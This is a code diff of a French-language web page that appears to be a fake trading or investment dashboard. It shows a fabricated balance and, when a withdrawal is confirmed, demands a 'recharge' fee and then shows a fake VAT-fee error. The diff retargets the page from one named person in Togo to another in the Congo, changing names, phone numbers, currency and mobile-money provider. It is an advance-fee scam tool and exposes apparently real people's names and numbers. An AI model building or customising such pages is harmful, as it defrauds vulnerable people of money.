@@ -245,10 +245,10 @@
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 3 296 000 FCFA</span>
+                <span class="balance">Solde: 1 200 $</span>
                 <div class="account-info">
-                    <span id="user-name"> Dossou Yawa Elisabeth</span><br>
-                    <span id="user-phone">228 93 68 34 91</span>
+                    <span id="user-name"> Sifa Wamushado Jolie</span><br>
+                    <span id="user-phone">243 099 895 5971</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -277,7 +277,7 @@
                 </div>
             </section>
             <section class="actions-container">
-                <button id="orange-money">Retirer via TMoney</button>
+                <button id="orange-money">Retirer via Airtel Money</button>
                 <button id="paypal">Retirer via PayPal</button>
             </section>
             <section class="withdrawal-form" id="withdrawal-form">
@@ -310,17 +310,17 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "Dossou Yawa Elisabeth";
-                const accountNumber = "228 93 68 34 91";
-                const balance = "3 296 000 FCFA";
+                const accountName = "Sifa Wamushado Jolie";
+                const accountNumber = "243 099 895 5971";
+                const balance = "1 200 $";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
 
             document.getElementById('orange-money').addEventListener('click', () => {
-                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via TMoney ?");
+                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Airtel Money ?");
                 if (confirmWithdrawal) {
-                    setWithdrawalInfo("Tmoney");
+                    setWithdrawalInfo("Airtel money");
                 }
             });
 
@@ -332,7 +332,7 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher Dossou, Veuillez recharger votre compte d\'un montant de 280 000 FCFA afin de recevoir vos bénéfices dans les 5 minutes.');
+                alert('Cher Wamushado, Veuillez recharger votre compte d\'un montant de 280 $ afin de recevoir vos bénéfices dans les 5 minutes.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
                 errorMessage.textContent = 'Erreur : Frais de tva néccéssaire.';
